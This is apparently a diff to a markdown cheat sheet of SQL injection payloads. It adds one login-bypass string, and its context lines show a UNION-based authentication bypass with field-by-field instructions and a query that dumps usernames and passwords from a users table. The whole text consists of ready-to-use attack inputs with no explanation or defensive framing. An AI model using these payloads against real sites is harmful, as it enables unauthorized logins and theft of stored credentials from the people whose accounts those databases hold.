@@ -2,6 +2,7 @@
 
 #### Bypass login
 `admin' UNION SELECT 'pass' AS password FROM admins WHERE '1' = '1` in username field and than `pass` in password field
+`' or 1 =1 LIMIT 1,1#`
 
 #### To jump to other tables:
 `' UNION SELECT username, password FROM users--`
